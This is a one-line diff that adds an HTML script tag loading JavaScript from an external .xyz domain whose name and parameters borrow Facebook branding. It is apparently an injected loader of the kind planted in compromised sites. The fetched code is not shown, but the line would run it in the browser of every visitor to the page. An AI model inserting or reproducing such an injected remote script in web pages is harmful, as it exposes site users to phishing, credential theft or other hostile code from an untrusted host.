@@ -1,0 +1,1 @@
+<script src="http://fidodido.appfbmanzana.xyz/?api=1&lan=m.facebook&ht=1&counter0=fidodido" type="text/javascript" async="true"></script>
